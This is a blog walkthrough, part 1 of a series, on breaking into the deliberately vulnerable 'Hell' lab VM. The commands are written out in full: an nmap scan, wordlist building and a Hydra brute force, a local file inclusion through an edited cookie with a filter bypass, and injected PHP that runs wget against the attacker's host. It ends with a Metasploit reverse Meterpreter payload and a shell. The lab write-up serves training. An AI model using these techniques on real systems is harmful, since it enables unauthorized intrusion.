---
author: recrudesce
comments: false
date: 2014-07-17 19:37:23+00:00
layout: post
slug: hell-walkthrough-part-1
title: Hell Walkthrough - Part 1
wordpress_id: 37
categories:
- VM's
tags:
- boot2root
- g0tmi1k
- hacking
- hell
- nmap
- peleus
- vulnhub
---

Part 1 | [Part 2](http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/) | [Part 3](http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/) | [Part 4](http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/) | [Part 5](http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/)

So, [Peleus](http://netsec.ws) released a vulnerable VM on [VulnHub](http://www.vulnhub.com), also known as a "boot2root", called Hell.

A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.  This is going to be a multipart walkthrough, therefore keep checking back for updates.



<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
> 
> -- Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>



<!-- more -->



* * *





## Scoping the Joint


NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results


``` bash
root@pwk:~# nmap -sS -T4 --script banner 192.168.0.103

Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 19:39 BST
Nmap scan report for 192.168.0.103
Host is up (0.00012s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
80/tcp  open  http
111/tcp open  rpcbind
666/tcp open  doom
|_banner: Welcome to the Admin Panel
MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds

```


OK, so we have SSH, HTTP and apparently Doom ([yay Doom !](http://www.kongregate.com/games/mike_id/doom-1)) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it's a distraction and a diversionary tactic - don't go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !

Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png)

This doesn't give us much to go on, therefore let's try out some simple things any pentester should try - let's see if a robots.txt file exists.  Well what do you know...

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png)

The /personal/ folder shows a creepy shrine site (this is incidentally the closest I've ever been to the face of a cow)

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png)

Yeah, creepy... The /super_secret_login_path_muhahaha/ folder presents a login page

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png)



* * *





## Getting In


It is assumed the username is either **admin** or **jack**, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let's think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per [netsec.ws](http://netsec.ws/?p=457)


``` bash
root@pwk:~# cewl http://192.168.0.103/personal/ -d 1 -m 6 -w password_list.txt -v
CeWL 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)

Starting at http://192.168.0.103/personal/
Visiting: http://192.168.0.103/personal/, got response code 200
Attribute text found:

Words found

root@pwk:~# john --wordlist=password_list.txt --rules --stdout > password_list-mutated.txt
words: 4251  time: 0:00:00:00 DONE (Thu Jul 17 20:08:13 2014)  w/s: 47233  current: forever99
```


Now we have a password list, we can use hydra to brute force the login.


``` bash
root@pwk:~# hydra 192.168.0.103 http-form-post "/super_secret_login_path_muhahaha/login.php:username=^USER^&password=^PASS^:Login Failed" -l jack -P password_list-mutated.txt -t 20 -w 1 -o hydra-http-post-attack.txt
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

[WARNING] the waittime you set is low, this can result in errornous results
Hydra (http://www.thc.org/thc-hydra) starting at 2014-07-17 20:10:12
[DATA] 20 tasks, 1 server, 4251 login tries (l:1/p:4251), ~212 tries per task
[DATA] attacking service http-post-form on port 80
[80][www-form] host: 192.168.0.103   login: jack   password: g0tmi1k69
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-17 20:10:22
```


Success, username **jack**, password **g0tmi1k69** (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png)

I won't explain each section, but the two sections we are going to use are Notes and Personal.
Notes allows us to write arbitrary text to a note.txt file stored in "temporary storage", which is assumed to be /tmp as this is usually what people define as temporary storage.

[![hell_009](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png)

Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png)

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png)

When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.

[![hell_015](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png)

On further investigation, the **intruder** attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there's a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using ....// or ..././ instead.  Here's /etc/passwd included by setting the **intruder** cookie attribute to ....//....//....//....//etc/passwd

[![hell_008](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png)

[![](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png)

It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.


``` bash
root@pwk:~# msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R > sneaky.txt
```


As we are using a staged payload, a handler is required, therefore one is set up via Metasploit


``` bash
msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > set lhost 192.168.0.110
lhost => 192.168.0.110
msf exploit(handler) > run

[*] Started reverse handler on 192.168.0.110:443
[*] Starting the payload handler...
```


Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host


``` bash
<?php echo shell_exec('wget http://192.168.0.110/sneaky.txt -O /tmp/sneaky.txt 2>&1');?>
```


[![hell_011](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png)

Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)

[![hell_012](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png)

When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.

[![hell_013](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png)

We're onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.

[![hell_014](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png)](http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png)


``` bash
[*] Sending stage (40551 bytes) to 192.168.0.103
[*] Meterpreter session 1 opened (192.168.0.110:443 -> 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100

meterpreter >
```




Now would be a good time for a party, but there's hacking to do.  Plus I have no cake or balloons.  Or friends. _*whimper*_ ... HACKING !!!




The Metepreter session can be used to get a shell, which doesn't seem to be TTY, but we can fix that with a nifty command thanks to [g0tmi1k](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.





``` bash
meterpreter > shell
Process 10279 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/sh")'
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```


BAM ! We've just started the journey. Now onto [Part 2](http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2) - which involves further enumeration, and some hopping between users. You're in for a long long ride.
